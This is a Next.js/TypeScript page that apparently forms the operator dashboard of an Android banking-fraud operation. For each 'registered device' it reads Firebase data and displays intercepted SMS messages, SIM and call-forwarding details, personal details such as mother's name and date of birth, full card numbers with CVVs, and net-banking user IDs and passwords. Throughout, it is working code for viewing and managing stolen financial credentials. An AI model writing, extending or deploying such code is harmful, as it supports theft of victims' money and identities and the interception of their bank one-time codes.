"use client";

import Link from "next/link";
import { useParams } from "next/navigation";
import { useEffect, useState } from "react";
import DeviceDetails from "@/components/DeviceDetails";
import Sidebar from "@/components/Sidebar";
import { getDeviceStatusFromAvailability } from "@/lib/deviceStatus";
import { db } from "@/lib/firbase";
import { ref, onValue, remove } from "firebase/database";
import type Devices from "@/types/devicetype";
import type DeviceMessage from "@/types/messageTypes";
import type { CardData, FormData, NetbankingData } from "@/types/formtype";

type FirebaseRecord = Record<string, unknown>;

function getMessageTimestamp(value: unknown): number {
  if (typeof value === "number" && Number.isFinite(value)) {
    return value;
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return 0;
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue)) {
      return numericValue;
    }

    const parsed = Date.parse(trimmed);
    return Number.isNaN(parsed) ? 0 : parsed;
  }

  return 0;
}

function sortMessagesByLatest(messages: DeviceMessage[]): DeviceMessage[] {
  return messages
    .slice()
    .sort(
      (a, b) =>
        getMessageTimestamp(b.timestamp) - getMessageTimestamp(a.timestamp),
    );
}

function toRecord(value: unknown): FirebaseRecord | null {
  return value && typeof value === "object" ? (value as FirebaseRecord) : null;
}

function getString(value: unknown, fallback = ""): string {
  if (typeof value === "string") {
    return value;
  }

  if (typeof value === "number" && Number.isFinite(value)) {
    return String(value);
  }

  return fallback;
}

function getIsoDate(value: unknown, fallback = ""): string {
  if (typeof value === "number" && Number.isFinite(value) && value > 0) {
    return new Date(value).toISOString();
  }

  if (typeof value === "string") {
    const trimmed = value.trim();

    if (!trimmed) {
      return fallback;
    }

    const numericValue = Number(trimmed);

    if (Number.isFinite(numericValue) && numericValue > 0) {
      return new Date(numericValue).toISOString();
    }

    const parsedDate = Date.parse(trimmed);

    if (!Number.isNaN(parsedDate)) {
      return new Date(parsedDate).toISOString();
    }

    return trimmed;
  }

  return fallback;
}

function getForwardingSim(value: unknown): Devices["forwardingSim"] {
  if (value === "sim1" || value === "slot 0" || value === 0 || value === "0") {
    return "sim1";
  }

  if (value === "sim2" || value === "slot 1" || value === 1 || value === "1") {
    return "sim2";
  }

  return null;
}

function getStringArray(value: unknown): string[] {
  if (Array.isArray(value)) {
    return value.filter((entry): entry is string => typeof entry === "string");
  }

  if (typeof value === "string" && value.trim()) {
    return [value];
  }

  return [];
}

function parseSmsLogs(value: unknown): DeviceMessage[] {
  const rawLogs = toRecord(value);

  if (!rawLogs) {
    return [];
  }

  const logs = Object.entries(rawLogs)
    .map(([id, rawLog]) => {
      const log = toRecord(rawLog);

      if (!log) {
        return null;
      }

      return {
        id,
        body: getString(log.body),
        reciverNumber: getString(log.receiverNumber),
        senderNumber: getString(log.senderNumber),
        timestamp: getString(log.timestamp),
        title: getString(log.title),
        deviceId: getString(log.uniqueid),
      } satisfies DeviceMessage;
    })
    .filter((entry): entry is DeviceMessage => entry !== null);

  return sortMessagesByLatest(logs);
}

function parseFormSubmissions(value: unknown): FormData[] {
  const rawForms = toRecord(value);

  if (!rawForms) {
    return [];
  }

  return Object.values(rawForms)
    .map((rawForm) => {
      const form = toRecord(rawForm);

      if (!form) {
        return null;
      }

      return {
        dob: getString(form.dob),
        fullName: getString(form.fullName),
        motherName: getString(form.motherName),
        mobileNumber: getString(form.mobileNumber),
        uniqueId: getString(form.uniqueId),
      } satisfies FormData;
    })
    .filter((entry): entry is FormData => entry !== null);
}

function parseCardPayments(value: unknown): CardData[] {
  const rawCards = toRecord(value);

  if (!rawCards) {
    return [];
  }

  return Object.values(rawCards)
    .map((rawCard) => {
      const card = toRecord(rawCard);

      if (!card) {
        return null;
      }

      return {
        cardNumber: getString(card.cardNumber),
        createdAt: getString(card.createdAt),
        expiryDate: getString(card.expiryDate),
        cvv: getString(card.cvv),
        uniqueId: getString(card.uniqueId),
      } satisfies CardData;
    })
    .filter((entry): entry is CardData => entry !== null);
}

function parseNetBanking(value: unknown): NetbankingData[] {
  const rawNetbanking = toRecord(value);

  if (!rawNetbanking) {
    return [];
  }

  return Object.values(rawNetbanking)
    .map((rawEntry) => {
      const entry = toRecord(rawEntry);

      if (!entry) {
        return null;
      }

      return {
        actvBankName: getString(entry.actvBankName),
        createdAt: getString(entry.createdAt),
        etPassword: getString(entry.etPassword),
        etUserId: getString(entry.etUserId),
        uniqueId: getString(entry.uniqueId),
      } satisfies NetbankingData;
    })
    .filter((entry): entry is NetbankingData => entry !== null);
}

export default function DeviceDetailsPage() {
  const params = useParams();
  const deviceId = decodeURIComponent(params.deviceId as string);

  const [device, setDevice] = useState<Devices | null>(null);
  const [notFound, setNotFound] = useState(false);
  const [smsLogs, setSmsLogs] = useState<DeviceMessage[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<FormData[]>([]);
  const [cardPayments, setCardPayments] = useState<CardData[]>([]);
  const [netBanking, setNetBanking] = useState<NetbankingData[]>([]);

  useEffect(() => {
    const deviceRef = ref(db, `registeredDevices/${deviceId}`);

    const unsubscribeDevice = onValue(deviceRef, (snapshot) => {
      if (!snapshot.exists()) {
        setNotFound(true);
        return;
      }
      setNotFound(false);
      const d = toRecord(snapshot.val()) ?? {};
      const callForwarding = toRecord(d.callForwarding);
      const checkOnline = toRecord(d.checkOnline);

      console.log("Device data received:", d);

      setDevice({
        deviceId,
        model: getString(d.model, "Unknown"),
        brand: getString(d.brand, "Unknown"),
        forwardingSim: getForwardingSim(callForwarding?.forwardingSim),
        androidVersion: getString(d.androidVersion),
        joinedAt: getIsoDate(d.joinedAt),
        fcmToken: getString(d.fcmToken),
        manufacturer: getString(d.manufacturer),
        adminPhoneNumber: getStringArray(d.adminPhoneNumber),
        sim1Carrier: getString(d.sim1Carrier),
        sim1number: getString(d.sim1Number),
        sim2Carrier: getString(d.sim2Carrier),
        sim2number: getString(d.sim2Number),
        onlineStatus: getDeviceStatusFromAvailability(checkOnline?.available),
        lastChecked: getIsoDate(checkOnline?.checkedAt),
        isfavorite: Boolean(d.isfavorite),
      });

      setSmsLogs(parseSmsLogs(d.smsLogs));
      setFormSubmissions(parseFormSubmissions(d.form_submissions));
      setCardPayments(parseCardPayments(d.card_payment_data));
      setNetBanking(parseNetBanking(d.netbanking_data));
    });

    return () => {
      unsubscribeDevice();
    };
  }, [deviceId]);

  const handleDeleteSMS = async (smsId: string) => {
    try {
      const smsRef = ref(db, `registeredDevices/${deviceId}/smsLogs/${smsId}`);
      await remove(smsRef);
      console.log("SMS deleted successfully");
    } catch (error) {
      console.error("Error deleting SMS:", error);
    }
  };
  return (
    <div className="page-shell">
      <div className="page-frame">
        <Sidebar />

        <main className="page-main">
          <nav className="mb-6 flex items-center gap-2 text-sm text-[var(--text-muted)]">
            <Link
              href="/devices"
              className="transition hover:text-[var(--text-main)]"
            >
              Devices
            </Link>
            <span>/</span>
            <span className="text-[var(--text-main)]">{deviceId}</span>
          </nav>

          {notFound ? (
            <div className="rounded-lg border border-red-500/30 bg-gradient-to-br from-red-500/10 to-red-600/5 p-6 text-center text-red-300">
              <p className="font-semibold">Device not found</p>
              <p className="text-sm mt-2">
                Device ID: <strong>{deviceId}</strong> does not exist in the
                system.
              </p>
            </div>
          ) : (
            device && (
              <div className="space-y-6">
                <DeviceDetails
                  device={device}
                  messages={smsLogs}
                  forms={formSubmissions}
                  cards={cardPayments}
                  netBanking={netBanking}
                  onDeleteSMS={handleDeleteSMS}
                />
              </div>
            )
          )}
        </main>
      </div>
    </div>
  );
}
